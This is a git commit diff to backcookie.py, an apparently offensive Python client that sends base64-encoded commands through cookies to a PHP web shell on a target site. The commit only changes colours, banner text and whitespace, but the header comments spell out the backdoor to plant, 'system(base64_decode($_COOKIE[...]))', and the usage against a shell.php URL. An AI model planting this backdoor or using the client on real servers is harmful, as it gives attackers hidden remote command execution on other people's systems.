13452270a854743899d1ea7a81c39487da1c09c7
José Pino (Fraph) <fraphcore@gmail.com>
2014-03-09 22:54:14 -0500

    backcookie
    Awesome...

--- backcookie.py
+++ backcookie.py
@@ -16,7 +16,7 @@ from urllib2 import build_opener, HTTPHandler #
 # Va con un rango de 1 a 0, pero al igual puedes especificar parametros.   #
 # Example: python backcookie.py http://target.com/shell.php                #
 #                                                                          #
-# Puedes cambiar el nombre de la cookie, en la linea 45.                   #
+# Puedes cambiar el nombre de la cookie, en la linea 46.                   #
 # el valor 1 por el nombre de tu cookie, tambien en php.                   #
 # Example: system(base64_decode($_COOKIE["yourcookie"]));                  ###
 # para que la conexion sea exitosa.                                          #
@@ -36,6 +36,7 @@ else:
 class color:
     azul = '\033[94m'
     rojo = '\033[91m'
+    verde = '\033[92m'
     blanco = '\033[0m'
 
 def backcookie(comando, a, debugLevel=0):
@@ -48,15 +49,15 @@ def backcookie(comando, a, debugLevel=0):
     print color.azul + l.read().strip() + color.blanco
 
 def main():
-    print "\t\t-------------\033[91mBackcookie\033[0m------------"
+    print color.blanco + "\t\t-------------" + color.rojo + "Backcookie" + color.blanco + "------------"
     print "\t\t+    Developed by: @mrjopino      +"
     print "\t\t+             To play             +"
     print "\t\t-----------------------------------\n\n"
-    print "\033[92m[+]\033[94m Happy hacking\033[0m"
-    print "\033[92m[+]\033[94m Aveces no es sierto, pero aveces si!\033[0m"
+    print color.verde + "[+] " + color.azul  + "Happy hacking" + color.blanco
+    print color.verde + "[+] " + color.azul  + "Aveces no es sierto, pero aveces si!\n" + color.blanco
 
     a = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; "
-    a = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; "   
+    a = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; "
     a = "WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; "
     a = ".NET CLR 3.0.30729; .NET CLR 3.5.30729; "
     a = "Media Center PC 6.0; .NET4.0C; .NET4.0E; "
